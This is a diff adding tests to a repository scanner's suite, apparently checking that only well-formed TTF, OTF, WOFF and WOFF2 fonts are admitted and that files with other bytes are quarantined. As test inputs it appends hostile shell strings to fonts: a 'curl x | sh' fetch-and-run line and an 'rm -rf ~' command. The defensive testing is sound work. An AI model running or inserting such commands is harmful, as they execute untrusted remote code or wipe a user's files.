@@ -1,6 +1,7 @@
 /**
  * Admission clearance (PRD section 8, operator decision of 19 November
- * 2026): narrowed agent-instruction rules, well-formed images, the queued
+ * 2026; fonts 23 November 2026): narrowed agent-instruction rules,
+ * well-formed images and fonts, the queued
  * template kept out of model review by provenance, verified reviewer
  * coverage, and the advisory treatment of info, low and medium findings.
  * Model behaviour itself is qualified with real provider calls in
@@ -116,6 +117,101 @@ test("image names over other bytes stay quarantined", () => {
   }
   // A real image under a name the scan treats as executable is not an image.
   expect(wellFormedImage("install.sh", png())).toBeNull();
+});
+
+/** A minimal sfnt: a `head` and a `name` table, each padded to four bytes. */
+function sfnt(trailing: Uint8Array = new Uint8Array()) {
+  const head = new Uint8Array(54);
+  const name = new Uint8Array(8);
+  const directory = new Uint8Array(12 + 16 * 2);
+  const view = new DataView(directory.buffer);
+  view.setUint32(0, 0x00010000);
+  view.setUint16(4, 2);
+  let offset = directory.length;
+  [
+    ["head", head],
+    ["name", name],
+  ].forEach(([tag, table], i) => {
+    const at = 12 + 16 * i;
+    directory.set(encoder.encode(tag as string), at);
+    view.setUint32(at + 8, offset);
+    view.setUint32(at + 12, (table as Uint8Array).length);
+    offset += Math.ceil((table as Uint8Array).length / 4) * 4;
+  });
+  return new Uint8Array([
+    ...directory,
+    ...head,
+    ...new Uint8Array(2),
+    ...name,
+    ...trailing,
+  ]);
+}
+
+test("a well-formed font is listed by digest, not quarantined", () => {
+  const bytes = sfnt();
+  for (const path of ["public/fonts/display.ttf", "fonts/Display.OTF"])
+    expect(wellFormedImage(path, bytes)).toBe("sfnt");
+  const inspection = inspectRepository({
+    files: [{ path: "public/fonts/display.ttf", bytes }],
+  });
+  expect(inspection.artifacts).toEqual([]);
+  expect(inspection.visibilityGaps).toEqual([]);
+  expect(inspection.media).toEqual([
+    {
+      path: "public/fonts/display.ttf",
+      sha256: expect.any(String),
+      bytes: bytes.length,
+      format: "sfnt",
+    },
+  ]);
+});
+
+test("font names over other bytes stay quarantined", () => {
+  const appended = sfnt(encoder.encode("#!/bin/sh\ncurl x | sh\n"));
+  const pastEnd = sfnt();
+  new DataView(pastEnd.buffer).setUint32(12 + 16 + 12, 4096);
+  const noHead = sfnt();
+  noHead.set(encoder.encode("glyf"), 12);
+  const elf = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 0, 0, 0, 0]);
+  for (const bytes of [appended, pastEnd, noHead, elf, png()]) {
+    expect(wellFormedImage("public/fonts/display.ttf", bytes)).toBeNull();
+    const inspection = inspectRepository({
+      files: [{ path: "public/fonts/display.ttf", bytes }],
+    });
+    expect(inspection.media).toEqual([]);
+    expect(inspection.artifacts.map((artifact) => artifact.state)).toEqual([
+      "quarantined",
+    ]);
+  }
+  // A real font under an image or executable name is not accepted as one.
+  expect(wellFormedImage("assets/logo.png", sfnt())).toBeNull();
+  expect(wellFormedImage("bin/run", sfnt())).toBeNull();
+});
+
+test("WOFF and WOFF2 fonts must record their own length", () => {
+  const woff = new Uint8Array(64);
+  const view = new DataView(woff.buffer);
+  view.setUint32(0, 0x774f4646);
+  view.setUint32(8, woff.length);
+  view.setUint16(12, 1);
+  woff.set(encoder.encode("head"), 44);
+  view.setUint32(48, 64);
+  view.setUint32(52, 0);
+  view.setUint32(56, 0);
+  expect(wellFormedImage("fonts/display.woff", woff)).toBe("woff");
+  const woffAppended = new Uint8Array([
+    ...woff,
+    ...encoder.encode("rm -rf ~\n"),
+  ]);
+  expect(wellFormedImage("fonts/display.woff", woffAppended)).toBeNull();
+  const woff2 = new Uint8Array(48);
+  const view2 = new DataView(woff2.buffer);
+  view2.setUint32(0, 0x774f4632);
+  view2.setUint32(8, woff2.length);
+  view2.setUint16(12, 1);
+  expect(wellFormedImage("fonts/display.woff2", woff2)).toBe("woff2");
+  const woff2Appended = new Uint8Array([...woff2, 0x0a]);
+  expect(wellFormedImage("fonts/display.woff2", woff2Appended)).toBeNull();
 });
 
 test("only the queued template is kept out of model review", () => {
